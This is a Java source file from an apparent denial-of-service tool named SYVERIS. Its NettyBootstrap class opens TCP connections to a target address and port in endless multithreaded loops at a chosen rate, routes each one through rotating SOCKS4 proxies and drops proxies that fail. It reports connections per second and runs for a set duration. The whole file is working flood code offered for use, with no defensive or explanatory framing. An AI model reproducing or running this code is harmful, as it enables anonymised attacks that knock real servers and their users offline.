package IO.SYVERIS.utils;

import IO.SYVERIS.Main;
import IO.SYVERIS.methods.Method;
import io.netty.bootstrap.Bootstrap;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.epoll.EpollEventLoopGroup;
import io.netty.channel.epoll.EpollSocketChannel;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.proxy.Socks4ProxyHandler;
import io.netty.util.ResourceLeakDetector;
import io.netty.util.concurrent.Future;
import io.netty.util.concurrent.GenericFutureListener;
import java.net.InetAddress;
import java.util.concurrent.ThreadFactory;

public class NettyBootstrap {
   public static final EventLoopGroup loopGroup;
   public static final Class<? extends Channel> socketChannel;
   public static final Method method;
   public static final ProxyLoader proxyLoader;
   public static final ChannelHandler channelHandler;
   public static final Bootstrap bootstrap;
   public static volatile int integer = 0;
   public static volatile int nettyThreads;
   public static volatile int triedCPS = 0;
   public static final boolean disableFailedProxies;
   public static volatile int totalConnections = 0;
   public static volatile int totalSeconds = 0;

   public static void start() throws Throwable {
      ResourceLeakDetector.setEnabled(true);
      InetAddress ip = Main.resolved;
      int port = Main.port;
      (new Thread(() -> {
         if (Main.duration < 1) {
            Main.duration = 600;
         }

         for(int i = 0; i < Main.duration; ++i) {
            try {
               Thread.sleep(1000L);
            } catch (InterruptedException var2) {
            }

            ++totalSeconds;
            System.out.println("Current CPS: " + integer + " | Target CPS: " + triedCPS + " | Average CPS: " + Math.ceil((double)totalConnections / (double)totalSeconds));
            integer = 0;
            triedCPS = 0;
         }

         System.out.println("Exit...");
         System.exit(0);
      })).start();
      int k;
      if (Main.targetCPS == -1) {
         for(k = 0; k < Main.loopThreads; ++k) {
            (new Thread(() -> {
               while(true) {
                  ++triedCPS;
                  bootstrap.connect(ip, port);
               }
            })).start();
         }
      } else {
         for(k = 0; k < Main.loopThreads; ++k) {
            (new Thread(() -> {
               while(true) {
                  for(int j = 0; j < Main.targetCPS / Main.loopThreads / 10; ++j) {
                     ++triedCPS;
                     bootstrap.connect(ip, port);
                  }

                  try {
                     Thread.sleep(100L);
                  } catch (InterruptedException var3) {
                     var3.printStackTrace();
                  }
               }
            })).start();
         }
      }

   }

   static {
      nettyThreads = Main.nettyThreads;
      disableFailedProxies = true;
      if (System.getProperty("os.name").toLowerCase().contains("win")) {
         socketChannel = NioSocketChannel.class;
         loopGroup = new NioEventLoopGroup(nettyThreads, new ThreadFactory() {
            public Thread newThread(Runnable r) {
               Thread t = new Thread(r);
               t.setDaemon(true);
               t.setPriority(10);
               return t;
            }
         });
      } else {
         socketChannel = EpollSocketChannel.class;
         loopGroup = new EpollEventLoopGroup(nettyThreads, new ThreadFactory() {
            public Thread newThread(Runnable r) {
               Thread t = new Thread(r);
               t.setDaemon(true);
               t.setPriority(10);
               return t;
            }
         });
      }

      method = Main.method;
      proxyLoader = Main.proxies;
      channelHandler = new ChannelHandler() {
         public void handlerRemoved(ChannelHandlerContext arg0) throws Exception {
         }

         public void handlerAdded(ChannelHandlerContext arg0) throws Exception {
         }

         public void exceptionCaught(ChannelHandlerContext c, Throwable t) throws Exception {
            c.close();
         }
      };
      ChannelHandler handler = new ChannelInitializer<Channel>() {
         public void channelInactive(ChannelHandlerContext ctx) throws Exception {
            ctx.channel().close();
         }

         protected void initChannel(final Channel c) throws Exception {
            try {
               final ProxyLoader.Proxy proxy = NettyBootstrap.proxyLoader.getProxy();
               final Socks4ProxyHandler proxyHandler = new Socks4ProxyHandler(proxy.addrs);
               proxyHandler.setConnectTimeoutMillis(5000L);
               proxyHandler.connectFuture().addListener(new GenericFutureListener<Future<? super Channel>>() {
                  public void operationComplete(Future<? super Channel> f) throws Exception {
                     if (f.isSuccess() && proxyHandler.isConnected()) {
                        NettyBootstrap.method.accept(c, proxy);
                     } else {
                        if (NettyBootstrap.disableFailedProxies) {
                           NettyBootstrap.proxyLoader.disabledProxies.put(proxy, System.currentTimeMillis());
                        }

                        c.close();
                     }

                  }
               });
               c.pipeline().addFirst(proxyHandler).addLast(NettyBootstrap.channelHandler);
            } catch (Exception var4) {
               c.close();
            }

         }

         public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
            ctx.close();
         }
      };
      bootstrap = (Bootstrap)((Bootstrap)((Bootstrap)((Bootstrap)((Bootstrap)(new Bootstrap()).channel(socketChannel)).group(loopGroup)).option(ChannelOption.TCP_NODELAY, true)).option(ChannelOption.AUTO_READ, false)).handler(handler);
   }
}
